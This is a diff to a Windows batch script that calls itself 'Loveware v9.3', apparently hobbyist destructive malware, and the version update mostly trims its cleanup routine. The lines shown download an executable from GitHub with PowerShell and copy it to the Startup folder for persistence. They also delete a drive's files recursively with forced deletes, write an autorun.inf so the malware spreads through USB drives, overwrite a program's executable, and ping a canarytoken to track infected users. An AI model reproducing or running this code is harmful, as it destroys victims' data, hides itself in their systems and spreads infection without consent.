@@ -2,7 +2,7 @@
 
 :: THIS VERSION CAN CONTAIN BUGS
 ::
-:: LOVEWARE v9.2
+:: LOVEWARE v9.3
 ::
 ::
 :: Name: Loveware
@@ -167,13 +167,7 @@ powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/TheG0df
 :: Copy SomeHugs.exe to the startup folder to prevent
 :: people from escaping death.
 
-:copylove
 XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-goto run1
-timeout 20
-goto copylove
-
-:run1
 
 :: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
 :: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7
@@ -306,10 +300,10 @@ del J:\*.* /f /s /q
 
 :: Create autorun file
 
-echo [autorun]>windows.inf
-echo ;open=Loveware.exe>>windows.inf
-echo ShellExecute=Loveware.exe>>windows.inf
-echo UseAutoPlay=1>>windows.inf
+echo [autorun] > windows.inf
+echo ;open=Loveware.exe >> windows.inf
+echo ShellExecute=Loveware.exe >> windows.inf
+echo UseAutoPlay=1 >> windows.inf
 
 :: Copy windows.inf to usb
 
@@ -448,9 +442,9 @@ copy /y Loveware.exe "C:\Program Files\Safari\Safari.exe"
 
 :: Create new vbs file that speaks.
 
-echo do>>speak.vbs
-echo CreateObject(“SAPI.SpVoice”).Speak”I love YOU”>>speak.vbs
-echo loop>>speak.vbs
+echo do > speak.vbs
+echo CreateObject(“SAPI.SpVoice”).Speak”I love YOU” >> speak.vbs
+echo loop >> speak.vbs
 
 :: Create the final payload "LoveChoice"
 
@@ -494,7 +488,7 @@ echo echo I love you too...>>LoveChoice.bat
 
 :: Create a little message
 
-echo @echo @echo off >> AUTOEXEC.BAT >> yes.bat
+echo @echo @echo off > AUTOEXEC.BAT >> yes.bat
 echo @echo I hope you listerned to my warning! >> AUTOEXEC.BAT >> yes.bat
 echo @echo timeout 20 >> AUTOEXEC.BAT >> yes.bat
 echo @echo exit >> AUTOEXEC.BAT >> yes.bat
@@ -601,25 +595,11 @@ echo timeout 400>>yes.bat
 
 :: Have mersy and let the guy live
 
-echo @echo off>clean.bat
-echo echo Starting Clean Up Process!!!!>>clean.vbs
+echo @echo off > clean.bat
+echo echo Starting Clean Up Process!!!! >> LoveChoice.bat
 
 echo :clean>>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(1).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(2).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(3).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(4).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(5).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(6).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(7).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(8).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(9).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(10).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(11).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(12).exe">>clean.bat
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(13).exe">>clean.bat
-echo goto clean>>clean.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe" >> clean.bat
 
 echo cls>>LoveChoice.bat
 
